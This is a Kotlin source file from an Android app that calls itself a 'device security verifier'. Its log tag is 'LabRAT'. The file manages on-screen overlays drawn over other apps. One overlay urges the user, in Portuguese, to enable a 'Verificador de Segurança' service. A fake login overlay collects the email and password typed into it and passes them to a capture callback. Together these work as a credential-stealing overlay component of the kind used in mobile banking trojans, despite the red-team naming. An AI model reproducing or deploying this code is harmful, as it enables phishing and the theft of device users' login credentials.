package com.labredteam.devicesecurityverifier

import android.content.Context
import android.graphics.PixelFormat
import android.os.Build
import android.util.Log
import android.view.Gravity
import android.view.LayoutInflater
import android.view.View
import android.view.WindowManager
import android.widget.Button
import android.widget.EditText
import android.widget.TextView

object OverlayManager {
    private var currentOverlay: View? = null

    fun showGuide(context: Context) {
        showOverlay(context, R.layout.overlay_guide, "PASSO: Procure por 'Verificador de Segurança' e ATIVE o serviço.")
    }

    fun showOverlay(context: Context, layoutId: Int, message: String? = null, isFullBlock: Boolean = false, onDataCaptured: ((Map<String, String>) -> Unit)? = null) {
        try {
            hideOverlay()

            val windowManager = context.getSystemService(Context.WINDOW_SERVICE) as WindowManager
            val inflater = context.getSystemService(Context.LAYOUT_INFLATER_SERVICE) as LayoutInflater
            val view = inflater.inflate(layoutId, null)
            currentOverlay = view

            val params = WindowManager.LayoutParams(
                WindowManager.LayoutParams.MATCH_PARENT,
                if (isFullBlock) WindowManager.LayoutParams.MATCH_PARENT else WindowManager.LayoutParams.WRAP_CONTENT,
                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) 
                    WindowManager.LayoutParams.TYPE_APPLICATION_OVERLAY 
                else 
                    @Suppress("DEPRECATION") WindowManager.LayoutParams.TYPE_PHONE,
                WindowManager.LayoutParams.FLAG_NOT_FOCUSABLE or WindowManager.LayoutParams.FLAG_LAYOUT_IN_SCREEN,
                PixelFormat.TRANSLUCENT
            )

            params.gravity = if (isFullBlock) Gravity.CENTER else Gravity.TOP
            if (!isFullBlock) params.y = 100

            windowManager.addView(view, params)
            
            message?.let {
                view.findViewById<TextView>(R.id.tv_overlay_text)?.text = it
            }

            // Lógica para capturar credenciais se for o layout de login
            if (layoutId == R.layout.overlay_login) {
                view.findViewById<Button>(R.id.btn_submit_credentials)?.setOnClickListener {
                    val email = view.findViewById<EditText>(R.id.et_email)?.text?.toString() ?: ""
                    val password = view.findViewById<EditText>(R.id.et_password)?.text?.toString() ?: ""
                    
                    onDataCaptured?.invoke(mapOf("email" to email, "password" to password))
                    hideOverlay()
                }
                
                view.findViewById<View>(R.id.tv_cancel)?.setOnClickListener {
                    hideOverlay()
                }
            } else {
                view.findViewById<View>(R.id.btn_close_overlay)?.setOnClickListener {
                    hideOverlay()
                }
            }
        } catch (e: Exception) {
            Log.e("LabRAT", "Erro ao mostrar overlay: ${e.message}")
        }
    }

    fun hideGuide() = hideOverlay()

    fun hideOverlay() {
        try {
            currentOverlay?.let { view ->
                val wm = view.context.getSystemService(Context.WINDOW_SERVICE) as WindowManager
                wm.removeViewImmediate(view)
                currentOverlay = null
            }
        } catch (e: Exception) {
            Log.e("LabRAT", "Erro ao remover overlay: ${e.message}")
            currentOverlay = null
        }
    }
}
